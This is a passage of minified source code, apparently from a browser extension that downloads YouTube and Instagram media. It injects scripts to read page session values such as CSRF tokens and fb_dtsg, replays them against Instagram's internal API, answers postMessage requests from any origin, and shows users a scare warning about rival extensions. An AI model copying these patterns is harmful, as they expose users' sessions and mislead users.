                        unavailable: react_default.a.createElement(embed_app, null),
                        error: react_default.a.createElement(embed_app, null),
                        downloadError: react_default.a.createElement(embed_download_error, null),
                        protected: react_default.a.createElement(embed_protected, null),
                    };
                return status in components ? react_default.a.createElement(react_default.a.Fragment, null, components[status], snap && react_default.a.createElement(normal_snapshot, null)) : null;
            },
            get_media_id_embed = (url) => new URL(url).pathname.split("/").pop();
        const url_checker_mediaUrls = ["^https?://(?:www\\.)?(?:youtu\\.be)|(youtube\\.com)|(youtube-nocookie\\.com)/embed/[a-zA-Z0-9_-]+"],
            gv_embed_generic_url_checker_isServiceUrl = is_embed,
            url_checker_isServiceMediaUrl = (url) => utils_regexp(url_checker_mediaUrls, url);
        var unsafe_window = {
            async get(path) {
                const [res] = await inject_script(document, "get-globals.js", { names: [path] });
                return res;
            },
            set: (name, value) => inject_script(document, "set-global.js", { name: name, value: value }),
        };
        const get_media_info_logger = make_logger(console, "YTDL", !0);
        var gv_embed_get_media_info = async (url, setMediaInfo) => {
            let id;
            try {
                const ytcfg = await unsafe_window.get("ytcfg");
                console.log("ytcfg ->", ytcfg), (id = ytcfg && ytcfg.data_ && ytcfg.data_.VIDEO_ID);
            } catch (e) {
                console.log(e);
            }
            id || (id = is_embed(url) ? get_media_id_embed(url) : get_media_id(url)), console.log("url: ", url, "ID!!!", id);
            const update = (mediaInfo) => setMediaInfo({ mediaInfo: mediaInfo });
            try {
                const data = await get_media_info_endpoints(id);
                data.status ? update(data) : transform_media_info(data, id, update);
            } catch (err) {
                update({ status: "error" }), get_media_info_logger.error("load", err);
            }
        };
        const eventsHandlers = {},
            dispatcher_idbfs = idbfs();
        var gv_embed_dispatcher = async function (evt) {
            const { data: data, source: source } = evt,
                store = await src_store();
            if (
                ("ping" === data.message && (console.log("PING!!!", this), (this.hidden = !0), this.widgetContainer && this.widgetContainer.setAttribute("style", "display:none"), source.postMessage({ message: "pong" }, "*")),
                "getMediaInfo" === data.message)
            ) {
                const setMediaInfo = (info) => source.postMessage({ message: "mediaInfo", info: info }, "*");
                gv_embed_get_media_info(data.url || window.location.href, setMediaInfo);
            }
            if ("download" === data.message) {
                const { info: info } = data;
                if (eventsHandlers[info.id]) return;
                const { eventRouter: eventRouter } = store.getState();
                eventRouter.emit("startDownloading", info, "gvEmbed"), (eventsHandlers[info.id] = {});
                const sendProgress = (progress) => {
                        source.postMessage({ message: "progress", progress: progress, id: info.id }, "*");
                    },
                    timer = new timer_Timer("gvEmbed");
                timer.bindGlobalStats(function () {
                    return store.getState().stats[this.serviceName];
                });
                const { cancel: cancel, stream: stream } = gv_downloader.bind(info)(sendProgress, timer);
                eventsHandlers[info.id].cancel = cancel;
                const result = await stream;
                let content;
                "string" == typeof result ? ((content = await dispatcher_idbfs.getContent(result)), dispatcher_idbfs.deleteChunkedFile(result)) : (content = await result.arrayBuffer()),
                    source.postMessage({ message: "stream", content: content, id: info.id }, "*"),
                    delete eventsHandlers[info.id];
            }
            if ("cancel" === data.message) {
                const { id: id } = data;
                eventsHandlers[id] && (eventsHandlers[id].cancel(), delete eventsHandlers[id]);
            }
        };
        class gv_embed_service_Service extends common {
            constructor() {
                super(), (this.hidden = !1), (this.serviceName = "gvEmbed"), window.addEventListener("message", gv_embed_dispatcher.bind(this), !1);
            }
            exactMatch(location) {
                return url_checker_isServiceMediaUrl(location.href);
            }
            async insertDownloadButton() {
                if (this.inserted()) return !1;
                const t = document.querySelector("#player #movie_player .ytp-chrome-top.ytp-show-cards-title .ytp-chrome-top-buttons");
                if (null === t) return window.sendLog({ type: "gvEmbed: no container found" }), !1;
                const appButton = this.insertContainer("appButton", t.parentNode, t);
                this.widgetContainer = appButton;
                const rightControls = document.querySelector(".ytp-right-controls"),
                    settingsButton = document.querySelector("[data-tooltip-target-id=ytp-settings-button]"),
                    snapshot = this.insertContainer("snapshot", rightControls, settingsButton);
                snapshot.setAttribute("style", "display:none");
                const moviePlayer = document.getElementById("movie_player");
                if (!moviePlayer) return !1;
                const dropdown = this.insertContainer("dropdown", moviePlayer),
                    tooltip = this.insertContainer("tooltip", moviePlayer),
                    topObserver = new MutationObserver(() => {
                        if (t.parentNode.contains(this.widgetContainer)) {
                            topObserver.disconnect();
                            const css = utils_minify(
                                    `\n          #${appButton.id} {\n            display: flex;\n            min-height: 40px;\n            margin: 0 10px;\n            padding-top: 6px;\n          }\n          #${snapshot.id} {\n            position: relative;\n            display: inline-block;\n            width: 40px;\n            height: 100%;\n          }\n          #${dropdown.id},\n          #${tooltip.id}  {\n            position: absolute;\n            width: 100%;\n            z-index: 9999;\n          }\n          #${dropdown.id} {\n            top: -12px;\n          }\n          #${tooltip.id} {\n            top: 8px;\n          }\n          .ytp-small-mode #${appButton.id} {\n            padding-top: 14px;\n          }\n          .ytp-small-mode #${dropdown.id} {\n            top: -4px;\n          }\n          .ytp-autohide #${appButton.id},\n          .ytp-autohide #${dropdown.id} {\n            opacity: 0;\n            transition: opacity .1s cubic-bezier(0.4,0.0,1,1);\n          }\n        `
                                ),
                                head = document.head || document.getElementsByTagName("head")[0],
                                style = document.createElement("style");
                            if ((head.appendChild(style), style.appendChild(document.createTextNode(css)), !this.hidden)) {
                                const headObserver = new MutationObserver(() => {
                                    head.contains(style) && (headObserver.disconnect(), this.widgetContainer.removeAttribute("style"));
                                });
                                headObserver.observe(head, { attributes: !1, childList: !0, characterData: !1, subtree: !0 });
                            }
                        }
                    });
                return topObserver.observe(t.parentNode, { attributes: !1, childList: !0, characterData: !1, subtree: !0 }), this.hidden && this.widgetContainer.setAttribute("style", "display:none"), !0;
            }
            start() {
                console.log("START!!!"), this.emit("hit"), this.checkLocation();
                const addButton = this.addButton.bind(this);
                this.onLoad.bind(this, addButton)();
            }
            layoutIsReady() {
                const t = document.querySelector("#player #movie_player .ytp-chrome-top.ytp-show-cards-title .ytp-chrome-top-buttons");
                return console.log("LAYOUT READY?", null !== t), null !== t;
            }
        }
        const gv_embed_getTheme = () => "dark";
        var tiny_app_styled_button = styled_components_browser_esm.a.button.withConfig({ displayName: "styled-button", componentId: "sc-1t18kpb-0" })`outline:none;flex:1;display:flex;align-items:center;justify-content:center;cursor:${(
                props
            ) => (!1 === props.enabled ? "default" : "pointer")};background:transparent !important;${(props) => {
                if (props.download) {
                    const result = `\n        padding: 0 9px;\n        border: 1px solid ${props.border};\n      `;
                    if ("ltr" === props.dir) return `\n          ${result}\n          border-right: none;\n          border-top-left-radius: 2px;\n          border-bottom-left-radius: 2px;\n        `;
                    if ("rtl" === props.dir) return `\n          ${result}\n          border-left: none;\n          border-top-right-radius: 2px;\n          border-bottom-right-radius: 2px;\n        `;
                }
                if (props.dropdown) {
                    const result = `\n        padding: 0;\n        border: 1px solid ${props.border};\n      `;
                    if ("ltr" === props.dir) return `\n          ${result}\n          border-left: none;\n          border-top-right-radius: 2px;\n          border-bottom-right-radius: 2px;\n        `;
                    if ("rtl" === props.dir) return `\n          ${result}\n          border-right: none;\n          border-top-left-radius: 2px;\n          border-bottom-left-radius: 2px;\n        `;
                }
                return "\n      padding: 0 6px;\n      border: none;\n      border-radius: 2px;\n    ";
            }} & .iconDownload{max-height:calc(100% - 10px);margin:0 4px;fill:white;}& span{color:${(props) => (props.dropdown ? "#5e5e5e" : "white")};${(props) =>
                props.dropdown &&
                '\n      display: flex;\n      padding: 0 6px;\n      &::before {\n        content: " ";\n        width: 4px;\n      }\n      &::after {\n        content: " ";\n        width: 9px;\n        height: 9px;\n        margin: 0 4px;\n        transform: rotate(45deg) scale(0.7);\n        border-right: 2px solid #5e5e5e;\n        border-bottom: 2px solid #5e5e5e;\n      }\n    '}}`,
            tiny_download_error = () => {
                const { setStatus: setStatus } = use_app_state(["setStatus"]),
                    [isDropdownVisible, setIsDropdownVisible] = Object(react.useState)(!1);
                return react_default.a.createElement(
                    error_boundary,
                    null,
                    react_default.a.createElement(
                        react_router_MemoryRouter,
                        null,
                        react_default.a.createElement(
                            ui_dropdown,
                            {
                                overlay: react_default.a.createElement(app_body, null),
                                trigger: "hover",
                                onVisibleChange: (visible) => {
                                    setIsDropdownVisible(visible);
                                },
                            },
                            react_default.a.createElement(
                                tiny_app_styled_button,
                                {
                                    isDropdownVisible: isDropdownVisible,
                                    onClick: () => {
                                        setStatus("idle");
                                    },
                                },
                                react_default.a.createElement(extension_logo, { className: "iconExtensionLogo" })
                            )
                        )
                    )
                );
            };
        var arrow_down = ({ style: style, color: color, className: className }) =>
                react_default.a.createElement(
                    "svg",
                    { xmlns: "http://www.w3.org/2000/svg", width: "10.6px", height: "12.4px", viewBox: "0 0 10.6 12.4", style: style, className: className },
                    react_default.a.createElement("path", {
                        fill: color,
                        d: "M9,6.7l-3,3V1.1c0-0.4-0.3-0.7-0.7-0.7S4.6,0.7,4.6,1.1v8.6l-3-3c-0.3-0.3-0.7-0.3-1,0s-0.3,0.7,0,1l4.1,4.1 C4.9,12,5.1,12,5.4,12c0.2,0,0.5,0,0.6-0.2l4.1-4.1c0.3-0.3,0.3-0.7,0-1C9.8,6.4,9.3,6.4,9,6.7z",
                    })
                ),
            tiny_unavailable = ({ isSplit: isSplit, setSplitDownloadButtonNode: setSplitDownloadButtonNode, openLandingUrl: openLandingUrl }) => {
                const { dir: dir, publicIds: publicIds } = use_app_state(["dir", "publicIds"]),
                    { webPortalName: webPortalName } = config.a,
                    { btnTextId: btnTextId } = publicIds;
                return react_default.a.createElement(
                    error_boundary,
                    null,
                    react_default.a.createElement(
                        react_router_MemoryRouter,
                        null,
                        isSplit &&
                            react_default.a.createElement(
                                app_styled_button,
                                {
                                    download: "true",
                                    dir: dir,
                                    border: "#d5d0d0",
                                    ref: (node) => {
                                        node && setSplitDownloadButtonNode(node);
                                    },
                                },
                                react_default.a.createElement(icons_download, { className: "iconDownload" })
                            ),
                        react_default.a.createElement(
                            ui_dropdown,
                            { overlay: react_default.a.createElement(app_body, null), trigger: isSplit ? "click" : "hover" },
                            isSplit
                                ? react_default.a.createElement(app_styled_button, { dropdown: "true", dir: dir, border: "#d5d0d0" }, react_default.a.createElement(styled_text, { id: btnTextId }, webPortalName))
                                : react_default.a.createElement(
                                      app_styled_button,
                                      {
                                          onClick: () => {
                                              openLandingUrl();
                                          },
                                      },
                                      react_default.a.createElement(arrow_down, { className: "iconArrowDown" })
                                  )
                        )
                    )
                );
            };
        const button_default_Container = styled_components_browser_esm.a.div.withConfig({
                displayName: "button-default__Container",
                componentId: "sc-1r6450u-0",
            })`display:flex !important;flex-direction:row !important;height:24px !important;box-sizing:border-box !important;${(props) =>
                props.isSplit
                    ? `\n    overflow: hidden !important;\n    transition: background-color 0.25s ease-in-out, border-color 0.25s ease-in-out !important;\n    border-radius: 4px !important;\n    border: 2px solid ${
                          props.isDropdownVisible ? "#424242" : "#262626"
                      } !important;\n    background-color: ${props.isDropdownVisible ? "#424242" : "transparemt"} !important;\n  `
                    : `\n    transition: border-color 0.25s ease-in-out !important;\n    border: 2px solid ${
                          props.isDropdownVisible ? "#8e8e8e" : "#262626"
                      } !important;\n    border-radius: 12px !important;\n    min-width: 24px !important;\n    height: 24px !important;\n  `} ${(props) =>
                props.isImgDownloading &&
                "\n    transition: none !important;\n    & button .iconArrowDown { transition: none !important; }\n    &:hover {\n      border: 2px solid #8e8e8e !important;\n      & button .iconArrowDown {\n        fill: #8e8e8e !important;\n      }\n    }\n  "} & button{${(
                props
            ) =>
                props.isSplit
                    ? '\n      &:first-child {\n        padding: 0 4px !important;\n      }\n      &:last-child::before {\n        content: " " !important;\n        width: 2px !important;\n        height: 100% !important;\n        background-color: #717171 !important;\n      }\n    '
                    : "\n      width: 100% !important;\n    "}}& .iconArrowDown{transition:fill 0.25s ease-in-out !important;${(props) =>
                props.isSplit ? `\n      fill: ${props.isDropdownVisible ? "#ffffff" : "#262626"} !important;\n    ` : `\n      fill: ${props.isDropdownVisible ? "#8e8e8e" : "#262626"} !important;\n    `}}& span{${(props) =>
                props.isSplit
                    ? `\n      color: ${props.isDropdownVisible ? "#ffffff" : "#262626"} !important;\n    `
                    : `\n      color: ${props.isDropdownVisible ? "#8e8e8e" : "#262626"} !important;\n      margin: 0 8px !important;\n    `}}& div{border-top:6px solid ${(props) =>
                props.isDropdownVisible ? "#ffffff" : "#262626"} !important;${(props) => props.isDropdownVisible && "transform: rotate(180deg) !important;"}}`,
            button_default_Button = styled_components_browser_esm.a.button.withConfig({
                displayName: "button-default__Button",
                componentId: "sc-1r6450u-1",
            })`display:flex !important;align-items:center !important;align-items:center !important;justify-content:center !important;outline:0 !important;background-color:transparent !important;border:0 !important;padding:0 !important;cursor:pointer !important;position:relative !important;& .iconSemicircles,& .iconExtensionLogo{transition:fill 0.25s ease-in-out !important;fill:${(
                props
            ) => (props.isDropdownVisible ? "#8e8e8e" : "#262626")} !important;}& .iconExtensionLogo{height:20px !important;position:absolute !important;left:50% !important;transform:scale(0.63) translateX(-65%) !important;}`,
            button_default_Text = styled_components_browser_esm.a.span.withConfig({
                displayName: "button-default__Text",
                componentId: "sc-1r6450u-2",
            })`font-family:Arial,Helvetica,sans-serif !important;font-size:12px !important;user-select:none !important;margin:0 4px !important;transition:color 0.25s ease-in-out !important;&:not(:only-child)::before{content:" " !important;display:inline-block !important;width:2px !important;}`,
            Triangle = styled_components_browser_esm.a.div.withConfig({
                displayName: "button-default__Triangle",
                componentId: "sc-1r6450u-3",
            })`margin:0 4px !important;width:0 !important;height:0 !important;border-left:6px solid transparent !important;border-right:6px solid transparent !importatn;transition:border-top-color 0.25s ease-in-out !important;`,
            ButtonTiny = ({ isSplit: isSplit, setSplitDownloadButtonNode: setSplitDownloadButtonNode, status: status }) => {
                const { defaultItem: defaultItem } = use_app_state(["defaultItem"]),
                    isError = "unavailable" === status || "error" === status,
                    { webPortalName: webPortalName } = config.a,
                    [isDropdownVisible, setIsDropdownVisible] = Object(react.useState)(!1);
                return react_default.a.createElement(
                    error_boundary,
                    null,
                    react_default.a.createElement(
                        react_router_MemoryRouter,
                        null,
                        react_default.a.createElement(
                            button_default_Container,
                            { isSplit: isSplit, isDropdownVisible: isDropdownVisible },
                            isSplit &&
                                react_default.a.createElement(
                                    button_default_Button,
                                    {
                                        ref: (node) => {
                                            node && setSplitDownloadButtonNode(node);
                                        },
                                    },
                                    "idle" === status && react_default.a.createElement(arrow_down, { className: "iconArrowDown" }),
                                    react_default.a.createElement(
                                        button_default_Text,
                                        null,
                                        isError ? react_default.a.createElement(react_default.a.Fragment, null, webPortalName) : react_default.a.createElement(ExtTitle, { item: defaultItem })
                                    )
                                ),
                            react_default.a.createElement(
                                ui_dropdown,
                                {
                                    overlay: react_default.a.createElement(app_body, null),
                                    trigger: isSplit ? "click" : "hover",
                                    onVisibleChange: (visible) => {
                                        setIsDropdownVisible(visible);
                                    },
                                },
                                react_default.a.createElement(
                                    button_default_Button,
                                    null,
                                    isSplit
                                        ? react_default.a.createElement(Triangle, null)
                                        : isError
                                        ? react_default.a.createElement(button_default_Text, null, webPortalName)
                                        : react_default.a.createElement(arrow_down, { className: "iconArrowDown" })
                                )
                            )
                        )
                    )
                );
            };
        var app_button_default = ({ isSplit: isSplit, setSplitDownloadButtonNode: setSplitDownloadButtonNode }) => {
            const { status: status, defaultItem: defaultItem, download: download } = use_app_state(["status", "defaultItem", "download"]);
            return "imgDownloading" === status
                ? react_default.a.createElement(
                      button_default_Container,
                      { isSplit: !1, isImgDownloading: !0 },
                      react_default.a.createElement(
                          button_default_Button,
                          {
                              onClick: () => {
                                  console.log("Download Image", defaultItem), download(defaultItem);
                              },
                          },
                          react_default.a.createElement(arrow_down, { className: "iconArrowDown" })
                      )
                  )
                : react_default.a.createElement(ButtonTiny, { isSplit: isSplit, setSplitDownloadButtonNode: setSplitDownloadButtonNode, status: status });
        };
        var tiny_app = () => {
            const { status: status, sendEvent: sendEvent, download: download, appButtonStyle: appButtonStyle, getServiceUrl: getServiceUrl } = use_app_state(["status", "sendEvent", "download", "appButtonStyle", "getServiceUrl"]),
                { i18n: i18n } = useTranslation(),
                isSplit = "Classic" === appButtonStyle,
                openLandingUrl = Object(react.useCallback)(() => {
                    const landingUrl = getServiceUrl(window.location.href, i18n.language);
                    window.open(landingUrl, "_blank"), sendEvent({ action: "button_limited_landing", format: "" });
                }, [i18n, sendEvent, getServiceUrl]),
                [splitDownloadButtonNode, setSplitDownloadButtonNode] = Object(react.useState)();
            return (
                use_event_listener(splitDownloadButtonNode, "click", (e) => {
                    e.preventDefault(), "unavailable" === status || "error" === status ? openLandingUrl() : download();
                }),
                react_default.a.createElement(app_button_default, { isSplit: isSplit, setSplitDownloadButtonNode: setSplitDownloadButtonNode, openLandingUrl: openLandingUrl })
            );
        };
        let tiny_isActiveDownloadNotificationShow = !1,
            tiny_isCompetitorsDetectionNotificationShow = !0;
        const tiny_Container = styled_components_browser_esm.a.div.withConfig({
                displayName: "tiny__Container",
                componentId: "sc-tnetla-0",
            })`display:flex;flex-direction:row;align-items:center;justify-content:space-between;margin:0 -4px;& button{margin:0 4px;}`,
            tiny_ButtonUnderline = styled_components_browser_esm.a.button.withConfig({
                displayName: "tiny__ButtonUnderline",
                componentId: "sc-tnetla-1",
            })`outline:none;border:none;padding:6px 8px;margin:0 auto 24px;display:block;cursor:pointer;font-size:16px;text-decoration:underline;background-color:transparent;color:${(props) => props.color};&:hover{color:${(props) =>
                props.hover};}`,
            tiny_BottomContent = ({ close: close }) => {
                const { theme: theme } = use_app_state(["theme"]),
                    modalNotificationStyles = theme && theme.modal_notification,
                    buttonUnderline = modalNotificationStyles && modalNotificationStyles.button_underline,
                    color = buttonUnderline && buttonUnderline.color,
                    hover = buttonUnderline && buttonUnderline.hover;
                return react_default.a.createElement(
                    tiny_Container,
                    null,
                    react_default.a.createElement(tiny_ButtonUnderline, { color: color, hover: hover, onClick: close }, "Я понимаю риск"),
                    react_default.a.createElement(ui_button, { icon: icons_info, text: "Как исправить эту проблему?" })
                );
            };
        var tiny = () => {
                const { status: status, snap: snap, warnAboutCompetitorsDetection: warnAboutCompetitorsDetection, addModal: addModal, appButtonStyle: appButtonStyle, setAppButtonStyle: setAppButtonStyle } = use_app_state([
                    "status",
                    "snap",
                    "warnAboutCompetitorsDetection",
                    "addModal",
                    "appButtonStyle",
                    "setAppButtonStyle",
                ]);
                "Modern" !== appButtonStyle && "Classic" !== appButtonStyle && setAppButtonStyle("Modern");
                const isMounted = use_is_mounted(),
                    { t: t } = useTranslation();
                Object(react.useEffect)(() => {
                    const showCompetitorsDetectionNotification = () => {
                            if (isMounted() && warnAboutCompetitorsDetection && !tiny_isCompetitorsDetectionNotificationShow) {
                                tiny_isCompetitorsDetectionNotificationShow = !0;
                                let close = (func) => {
                                    close = func;
                                };
                                addModal({
                                    type: "notification",
                                    props: {
                                        icon: react_default.a.createElement(lightning, null),
                                        message: "Внимание!",
                                        description: `Обнаружено расширение <b>${competitors_detection()}</b> для загрузки мультимедиа файлов.\n            Одновременная работа нескольких браузерных расширений может привести к <b>сбоям</b> в работе вашего браузера.`,
                                        bottomContent: react_default.a.createElement(tiny_BottomContent, { close: () => close() }),
                                        duration: -1,
                                        close: close,
                                    },
                                });
                            }
                        },
                        observer = new MutationObserver(() => {
                            competitors_detection() && (showCompetitorsDetectionNotification(), observer.disconnect());
                        });
                    return (
                        warnAboutCompetitorsDetection && (competitors_detection() ? showCompetitorsDetectionNotification() : observer.observe(document, { attributes: !1, childList: !0, characterData: !1, subtree: !0 })),
                        () => {
                            observer.disconnect();
                        }
                    );
                }, [warnAboutCompetitorsDetection, addModal, t, isMounted]),
                    Object(react.useEffect)(
                        () => (
                            "downloading" === status && (window.onbeforeunload = () => "Do you really want to close?"),
                            () => {
                                "downloading" === status && (window.onbeforeunload = null);
                            }
                        ),
                        [status]
                    );
                use_event_listener(window, "popstate", () => {
                    "downloading" === status &&
                        isMounted() &&
                        !tiny_isActiveDownloadNotificationShow &&
                        addModal({
                            type: "notification",
                            props: {
                                icon: react_default.a.createElement(icons_warning, null),
                                message: t("active_download_warning_notification_message"),
                                description: t("active_download_warning_notification_description"),
                                onClose: () => {
                                    isMounted() && (tiny_isActiveDownloadNotificationShow = !1);
                                },
                            },
                        });
                });
                const components = {
                    downloading: react_default.a.createElement(progress_bar, null),
                    liveStream: react_default.a.createElement(live_stream, null),
                    premiere: react_default.a.createElement(premiere, null),
                    gettingInfo: react_default.a.createElement(getting_info, null),
                    idle: react_default.a.createElement(tiny_app, null),
                    imgDownloading: react_default.a.createElement(tiny_app, null),
                    unavailable: react_default.a.createElement(tiny_unavailable, null),
                    error: react_default.a.createElement(tiny_app, null),
                    downloadError: react_default.a.createElement(tiny_download_error, null),
                };
                return status in components
                    ? react_default.a.createElement(react_default.a.Fragment, null, components[status], snap && react_default.a.createElement(normal_snapshot, null), react_default.a.createElement(ui_modals, null))
                    : null;
            },
            get_current_page_number = () => {
                if (document.querySelector("article._aatg ._acnb._acnf")) {
                    const icons = document.querySelector("article._aatg ._acnb._acnf").parentElement.children;
                    return Array.from(icons).findIndex((icon) => icon.className.includes("_acnf"));
                }
                if (document.querySelector("article._ab0- ._acnb._acnf")) {
                    const icons = document.querySelector("article._ab0- ._acnb._acnf").parentElement.children;
                    return Array.from(icons).findIndex((icon) => icon.className.includes("_acnf"));
                }
                return 0;
            };
        var parse_manifest = async (manifest, title) => {
            const oDOM = new DOMParser().parseFromString(manifest, "application/xml");
            console.log("MANIFEST!!!", oDOM);
            const sets = oDOM.querySelectorAll("Representation"),
                audio = (
                    await Promise.all(
                        Array.from(sets).map(async (xml) => {
                            const mimeType = xml.getAttribute("mimeType");
                            if (!mimeType.includes("audio/")) return null;
                            const bitrate = parseInt(xml.getAttribute("audioSamplingRate"), 10),
                                _url = xml.querySelector("BaseURL"),
                                _id = xml.getAttribute("id"),
                                contentLength = await getContentLength(_url.textContent),
                                audioStream = { url: _url.textContent, bitrate: bitrate, id: _id, title: title + ".m4a", mimeType: mimeType, contentLength: contentLength, canBeShared: !0 };
                            return (audioStream.obj = { ...audioStream }), audioStream;
                        })
                    )
                ).filter((stream) => stream),
                defaultAudio = audio.filter((rec) => rec.mimeType.includes("audio/mp4")).sort((a, b) => b.bitrate - a.bitrate)[0],
                defaultWebmAudio = audio.filter((rec) => rec.mimeType.includes("audio/webm")).sort((a, b) => b.bitrate - a.bitrate)[0];
            return {
                streams: [],
                audio: audio,
                video: (
                    await Promise.all(
                        Array.from(sets).map(async (xml) => {
                            const mimeType = xml.getAttribute("mimeType");
                            if (!["video/mp4", "video/webm"].includes(mimeType)) return null;
                            const _url = xml.querySelector("BaseURL"),
                                height = xml.getAttribute("height"),
                                width = xml.getAttribute("width"),
                                _id = xml.getAttribute("id"),
                                contentLength = await getContentLength(_url.textContent),
                                fps = parseInt(xml.getAttribute("frameRate"), 10);
                            return {
                                url: _url.textContent,
                                fps: fps || 30,
                                height: height ? parseInt(height, 10) : 0,
                                width: height ? parseInt(width, 10) : 0,
                                id: _id,
                                quality: parseInt(height, 10) + "p",
                                title: title + ".mp4",
                                type: mimeType.split("/")[1],
                                mimeType: mimeType,
                                contentLength: contentLength,
                            };
                        })
                    )
                )
                    .filter((stream) => stream)
                    .map((stream) => ({ ...stream, audio: "mp4" === stream.type ? defaultAudio : defaultWebmAudio, conversionRequired: !0 }))
                    .filter((stream) => stream.audio),
            };
        };
        const checkHeaders = async (url) => {
                const [contentType, contentLength] = await network_getHeaders(url, ["content-type", "content-length"]);
                return { contentType: contentType, contentLength: parseInt(contentLength, 10) };
            },
            append = (mediaInfo, newData) => {
                Object.keys(newData).forEach((key) => {
                    Array.isArray(newData[key]) ? (mediaInfo[key] = mediaInfo[key] ? [...mediaInfo[key], ...newData[key]] : newData[key]) : (mediaInfo[key] = newData[key]);
                });
            },
            transformPlainMediaInfo = (data) =>
                new Promise(async (resolve) => {
                    const title = data.id;
                    if (!((data) => 2 === data.media_type || data.is_video)(data)) {
                        const info = ((data, title) => {
                            const { image_versions2: imageVersions } = data;
                            if (!imageVersions) return null;
                            if (!imageVersions.candidates || !Array.isArray(imageVersions.candidates)) return null;
                            const imgs = imageVersions.candidates.map((res) => {
                                const { height: height, width: width, url: url } = res;
                                return { height: height, width: width, url: url };
                            });
                            return console.log("IMAGES!!!", imgs), { title: title, expires: 36e5, imgs: imgs };
                        })(data, title);
                        if (info && info.imgs.length) {
                            const defaultImg = info.imgs[0],
                                { contentType: mimeType, contentLength: contentLength } = await checkHeaders(defaultImg.url),
                                imgs = [((img, _title) => ({ ...img, title: `${_title}.${img.mimeType.split("/")[1]}` }))({ ...defaultImg, mimeType: mimeType, contentLength: contentLength }, info.title)];
                            resolve({ ...info, imgs: imgs, canonicalUrl: window.location.href });
                        } else resolve({ ...info, imgs: [], canonicalUrl: window.location.href });
                        return;
                    }
                    const mediaInfo = { isLifeStream: !1, expires: data.expires, title: title, canonicalUrl: window.location.href };
                    data.video_versions &&
                        append(
                            mediaInfo,
                            await (async (info, title) => {
                                const mp4Types = [101, 102, 103],
                                    promises = info.map(async (rec) => {
                                        const { url: url, type: type, height: height, width: width } = rec,
                                            { contentLength: contentLength } = await checkHeaders(url),
                                            mimeType = mp4Types.includes(type) ? "video/mp4" : "/";
                                        return {
                                            id: url,
                                            type: mimeType.split("/")[1],
                                            mimeType: mimeType,
                                            canBeShared: !0,
                                            fps: 30,
                                            url: url,
                                            quality: height + "p",
                                            height: height,
                                            width: width,
                                            title: title + ".mp4",
                                            contentLength: contentLength,
                                        };
                                    });
                                return { streams: await Promise.all(promises) };
                            })(data.video_versions, title)
                        ),
                        ((data) => !!data.video_dash_manifest)(data) &&
                            append(
                                mediaInfo,
                                await (async (manifest, title) => {
                                    const { streams: streams, video: video, audio: audio } = await parse_manifest(manifest, title);
                                    return (
                                        ((audio, title) => {
                                            const defaultAudio = audio.filter((rec) => rec.mimeType.includes("audio/mp4")).sort((a, b) => b.bitrate - a.bitrate)[0];
                                            if (defaultAudio) {
                                                const mp3 = { ...defaultAudio, mimeType: "audio/mp3", conversionRequired: !0, title: title + ".mp3" };
                                                audio.push(mp3);
                                            }
                                        })(audio, title),
                                        { streams: streams, video: video, audio: audio }
                                    );
                                })(((data) => data.video_dash_manifest)(data), title)
                            ),
                        console.log("MEDIA INFO IG!!!", mediaInfo),
                        resolve(mediaInfo);
                });
        var parse_media_info = (info) => (
                console.log("TRANSFORM INFO!!!", info),
                info.carousel_media
                    ? transformPlainMediaInfo(
                          ((data) => {
                              const num = get_current_page_number();
                              return { ...data, ...data.carousel_media[num] };
                          })(info)
                      )
                    : transformPlainMediaInfo(info)
            ),
            resolve_media_id = async (path) => {
                const [routingNamespace, resolveParams] = await inject_script(document, "get-globals.js", { names: ["Env.routing_namespace", "resolveParams"], wait: !0 });
                console.log("FROM GLOBALS!!!", routingNamespace, resolveParams);
                const {
                        __d: __d,
                        __user: __user,
                        __a: __a,
                        __dyn: __dyn,
                        __csr: __csr,
                        __req: __req,
                        __hs: __hs,
                        dpr: dpr,
                        __ccg: __ccg,
                        __rev: __rev,
                        __s: __s,
                        __hsi: __hsi,
                        __comet_req: __comet_req,
                        fb_dtsg: fb_dtsg,
                        jazoest: jazoest,
                        lsd: lsd,
                    } = resolveParams,
                    payload = {
                        "route_urls[0]": "" + path,
                        routing_namespace: routingNamespace,
                        __d: __d,
                        __user: __user,
                        __a: __a,
                        __dyn: __dyn,
                        __csr: __csr,
                        __req: String.fromCharCode(__req.charCodeAt(0) + 1),
                        __hs: __hs,
                        dpr: dpr,
                        __ccg: __ccg,
                        __rev: __rev,
                        __s: __s,
                        __hsi: __hsi,
                        __comet_req: __comet_req,
                        fb_dtsg: fb_dtsg,
                        jazoest: jazoest,
                        lsd: lsd,
                        __spin_r: __rev,
                        __spin_b: "trunk",
                        __spin_t: Math.floor(Date.now() / 1e3) - 1,
                    },
                    options = {
                        method: "POST",
                        headers: { "content-type": "application/x-www-form-urlencoded", "sec-fetch-site": "same-origin", "X-IG-D": __d, "X-FB-LSD": lsd },
                        body: Object.keys(payload)
                            .map((key) => `${encodeURIComponent(key)}=${encodeURIComponent(payload[key])}`)
                            .join("&"),
                    };
                let resolved;
                try {
                    const response = await ((url, options) => inject_script(document, "do-xhr-request.js", { url: url, ...options }))("https://www.instagram.com/ajax/bulk-route-definitions/", options);
                    console.log("RESOLVE RESPONSE!!!", response);
                    for (let i = 0; i < response.length; i++)
                        try {
                            resolved = JSON.parse(response.substring(i));
                            break;
                        } catch (e) {}
                    console.log("IG RESOLVE!!!", resolved);
                } catch (e) {
                    console.log("IG RESOLVE!!!", e);
                }
                if (!resolved) return;
                return resolved.payload.payloads[path].result.exports.rootView.props.media_id;
            };
        var ig_get_media_info = async (_, setMediaInfo) => {
            const url = `https://i.instagram.com/api/v1/media/${await resolve_media_id(document.location.pathname)}/info/`,
                [csrfToken, appId] = await inject_script(document, "get-globals.js", { names: ["window._sharedData.config.csrf_token", "window.__mqtt.$5.$8.$1"], wait: !0 });
            console.log("CSRF TOKEN!!!", csrfToken, appId);
            const options = { method: "GET", headers: { "Content-Type": "application/json", "x-csrftoken": csrfToken, "x-ig-app-id": appId } },
                response = await fetchBack(url, options);
            console.log("MEDIA INFO!!!", response);
            setMediaInfo({ mediaInfo: await parse_media_info(response.items[0]) });
        };
        const ig_downloader_getContent = makeGetContent(!1);
        var ig_downloader = get_local((url, contentLength, onprogress, options) =>
                download_stream(
                    url,
                    contentLength,
                    ((timer, onprogress) => (url, start, end) => {
                        const timeout = timer.getTimeout(end - start + 1);
                        return ig_downloader_getContent(`${url}&bytestart=${start}&byteend=${end}`, timeout, { onprogress: onprogress });
                    })(options.timer, onprogress),
                    options
                )
            ),
            ig_snap = function () {
                const video = document.querySelector("video"),
                    canvas = document.createElement("canvas"),
                    context = canvas.getContext("2d"),
